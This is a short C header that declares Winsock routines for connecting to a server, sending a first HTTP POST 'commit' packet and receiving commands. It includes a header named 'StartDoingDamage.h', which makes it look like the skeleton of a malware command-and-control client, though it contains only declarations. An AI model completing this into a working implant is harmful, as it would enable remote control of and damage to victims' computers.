#pragma once
#include "utilities.h"
#include "StartDoingDamage.h"


// function .....
int start_socket();

// This function start the socket connection
int connect_socket(WSADATA wsaData, struct sockaddr_in clientService, SOCKET* ConnectSocket);

// This function closes the connection socket
int close_socket(SOCKET* ConnectSocket);

// function sends POST http packet to the server -> first connection packet.
int send_first_commit_packet(SOCKET* s);


// function .....
int get_command(SOCKET* s, char* return_data);




// NOT IN USE!!
// function gets the data from the http packet and returns an array of array filled with the data
//struct MISSIONS* parse_http_packet(char* msg);